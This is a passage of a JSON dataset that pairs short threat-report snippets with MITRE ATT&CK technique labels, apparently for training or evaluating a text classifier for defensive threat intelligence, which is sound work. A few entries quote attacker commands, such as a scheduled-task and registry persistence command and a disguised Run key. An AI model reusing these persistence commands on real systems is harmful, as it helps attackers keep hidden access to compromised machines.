    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "launched with a command\nline",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was able to RDP to a backup server",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "uses Rundll32 for executing the dropper program.(Citation: FireEye FELIXROOT July 2018)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "identifies and kills anti-malware processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used `WinHTTP` `CreateProcess` and other APIs for C2 communications and other functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2.(Citation: Medium Metamorfo Apr 2020) ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "makes modifications to open-source scripts from GitHub and executes them on the victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "cyber actors used RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Other commands can be used to retrieve a detailed list of available services and currently running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "actors used compromised domain credentials for the victim's endpoint management platform Altiris to move laterally.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "used to retrieve a payload package containing the second stage PowerShell and two shellcode buffers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The computer name",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the targeted machine's name and GUID.(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "collects a unique identifier (UID) from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used the CreateProcessA and ShellExecute API function to launch commands after being injected into a selected process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used `ipconfig/all` to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can delete files and directories from targeted systems.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "stores collected data in log files before exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to execute compromised installation files for legitimate software including compression applications security software browsers file recovery applications and other tools and utilities.(Citation: Talos Promethium June 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can inject a malicious DLL into a process.(Citation: FireEye Poison Ivy)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence via the Startup folder or Run Registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used systeminfo and similar commands to acquire detailed configuration information of a victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has checked the OS version using `wmic.exe` and the `find` command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "stored targeted SMS messages that matched its target list in CSV files on the compromised system.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "will attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by setting a Registry Run key with the path depending on whether the victim account has user or administrator access.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "may use ipconfig /all to gather system network configuration details.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used various Windows API functions on a victim's machine. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "uses custom batch scripts to execute some of its components.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can delete files including its dropper component.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Various  malware enumerates logged-on users.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: SentinelOne Lazarus macOS July 2020)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "and inject it into winver.exe for the next-stage payload",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to identify the user of a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> C:\\windows\\TEMP\\[RANDOM].tmp.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Establish a session that originates from a target Domain Controller system directly to an external host over a clear text protocol, such as HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "staging the data in encrypted ZIP archives before upload.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has a download and upload functionality.(Citation: PWC KeyBoys Feb 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use native APIs for execution including GetProcessHeap GetProcAddress and LoadLibrary.(Citation: TrendMicro Taidoor)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once user credentials have been compromised, this tool takes “full control” of the account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by creating a scheduled task.(Citation: ESET Gazer Aug 2017)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can create a scheduled task to enable persistence mechanisms.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use various APIs to allocate memory and facilitate code execution/injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has command line access.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "enumerating current directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Write a.lnk file in the startup folder",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to modify the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows API calls including `NetUserAdd` and `NetUserDel`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used native WINAPI calls.(Citation: Medium Metamorfo Apr 2020)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "uses PowerShell to add a Registry Run key in order to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "the use of a PowerShell script to execute Mimikatz in-memory",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "machine names",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "and the rar files were deleted",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "A  macro deletes files after it has decoded and decompressed them.(Citation: Accenture Hogfish April 2018)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This parses command-line options",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The injection is also visible from memory dumps",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used ListPlanting to inject code into a trusted process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to communicate with C2 servers over HTTP GET/POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Adversary installed custom backdoor as a service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can delete specific files from a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "performs the injection by attaching its code into the APC queue using NtQueueApcThread API.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": " LoadModule() ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "modified the Registry to create a Windows service for itself on a compromised host.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Hashes For a list of all hashes of malware encountered during this campaign, please refer to the following file",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use a renamed image of `cmd.exe` for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "is used to execute programs and other actions at the command-line interface.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "In an attempt to remain undetected, AddSecurityPackage64.dll disables Windows event logging by killing threads of the Windows Event Log service without stopping the execution of the service itself",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "collects a list of running services with the command tasklist /v.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "collects information about running processes from victims.(Citation: DustySky)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "the final payload is an HTTPs Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "passes the PE payload to it, which the shellcode then loads and executes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has stored collected data in a file called `stari.txt`.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "WMI permanent event subscriptions can be used to trigger actions when specified conditions are met",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "installer plugin can schedule rundll32.exe to load the dispatcher.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "contains the “whoami” command",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A module in  collects information from the victim about the current user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the malware leverages various functions from the CryptoAPI, including CryptAcquireContextW(), CryptImportKey(), CryptSetKeyParam(), and CryptEncrypt().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "collects the computer name and host name on the compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can launch a reverse command shell.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can gather information about the user on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the new stealer is downloaded and executed",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell scripts in charge of downloading a second stage RokRAT shellcode",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used batch files that allowed them to establish persistence by adding the following Registry key: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost /v COMSysApp /t REG_MULTI_SZ /d COMSysApp /f`.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "produces file listings in order to search for files to be exfiltrated.(Citation: ESET Machete July 2019)(Citation: Cylance Machete Mar 2017)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "run a network recognition process to find the IP address of each of the ATMs",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "manipulating of registry keys",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used a reconnaissance module to identify active processes and other associated loaded modules.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "deletes the original dropped file from the victim.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download a file from the C2 server to the victim mobile device's SD card.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "backdoor has modified the Windows Registry to store the backdoor's configuration. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can determine the OS version bitness and enumerate physical drives on a targeted host.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wizard March 2022)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Some workstations allowed unprivileged accounts to have local administrator access",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can use cmd.exe to execute malicious files on compromised hosts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that checked if the ProgramData folder had folders or files with the keywords Kasper Panda or ESET.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can parse the hard drive on a compromised host to identify specific file extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can list the current running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can gather the hostname on a compromised machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "a batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate processes running on a victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used API calls during execution.(Citation: Cybereason Conti Jan 2021) ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.(Citation: FireEye APT19)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "installed a second stage persistence backdoor on infected device by abusing Windows Services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "command-line syntax was observed being used",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "with the function “WriteFile”.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can gather the victim OS version and whether it is 64 or 32 bit.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has incorporated code into several tools that attempts to terminate anti-virus processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate processes including properties to determine if they have the Common Language Runtime (CLR) loaded.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The server contained HTTP header data (SimpleHTTP/0.6 Python/3.8.10), indicating the use of a Python library called SIMPLEHTTPSERVER",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that can upload additional files to the victims machine.(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: Reaqta MuddyWater November 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "enumerates all running processes.(Citation: SecureList SynAck Doppelgnging May 2018)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The team used HTTPS",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware was injected into a SVCHOST process where a driver location pointed to the config file",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's Microsoft.IdentityServer.ServiceHost.exe process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used batch files to deploy open-source and multi-stage RATs.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can save a new file to the system from the C2 server.(Citation: Unit 42 DarkHydrus July 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can remove itself from a system.(Citation: Talos Cobalt Group July 2018)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors were observed using compromised credentials to access the Azure AD Connect device.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can use WMIC to execute scripts on targeted hosts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors installed DLLs and backdoors as Windows services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about the current user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by creating the following scheduled task schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can connect to remote shares using `WNetAddConnection2W`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "actors have used a modified version of  called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.(Citation: Dell TG-3390)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe on the victim's computer.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the scheduled task is set to trigger 60 minutes after the malware execution by default.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In this particular case in 2013, the config file included an unknown plugin set, aside from the usual ‘ddos’ plugin listing",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "to enable multiple Remote Desktop\nconnection sessions",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "includes various modules for finding files of interest on hosts and network shares.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate local drives on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the function CreateProcessWithLogonW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "obtains the IP address, location, and other relevant network information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files including an exploit for used privilege escalation.(Citation: ESET DazzleSpy Jan 2022)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used plugins with a self-delete capability.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Drive information retrieval",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has collected the IOPlatformUUID session UID and the OS version using the command sw_vers -productVersion.(Citation: Carbon Black Shlayer Feb 2019)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors executed multiple actions in the cloud using two privileged accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of current processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "then deletes the files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can delete its DLL file and related files by Registry value.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "collects local files and information from the victims local machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files and directories on a target machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Network shellcode registry keys",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "FakeRun’s PDB string (D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download payloads containing system commands to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol (RDP), and the threat actor was able to move freely across the network",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used   and tracert to enumerate the IP address and network environment and settings of the local host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can query the Registry to check for the presence of HKCU\\Software\\KasperskyLab.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 and data exfiltration.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "submitted to the C2 server through HTTP protocol using the POST method.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "a version of the malware that was injected into a victim’s system",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can achieve persitence on the infected machine by setting the Registry run key. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has captured victim IP address details.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use known credentials to run commands and spawn processes as a domain user account.(Citation: cobaltstrike manual)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Get content list from a specified directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by creating a .lnk file in the Start menu.(Citation: ESET Gazer Aug 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can search for specific files and list directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used malicious documents to lure victims into allowing execution of PowerShell scripts.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "executes the whoami on the victims machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "downloads several additional files and saves them to the victim's machine.(Citation: Trend Micro Totbrick Oct 2016)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to maintain persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional files from the C2.(Citation: Unit42 BabyShark Apr 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "identifies processes and collects the process ids.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "previously injected into",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "used for HTTP server responses",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has configured persistence to the Registry ket HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Spotify =% APPDATA%\\Spotify\\Spotify.exe and used .LNK files in the startup folder to achieve persistence.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "downloads and uploads files to and from the victims machine.(Citation: FireEye FELIXROOT July 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username from a victim machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "leverages valid accounts after gaining credentials for use within the victim domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use GetUserNameW GetComputerNameW and GetComputerNameExW to gather information.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.(Citation: CISA AA20-259A Iran-Based Actor September 2020)",
    "command": "",
    "labels": [
      "T1053.005"
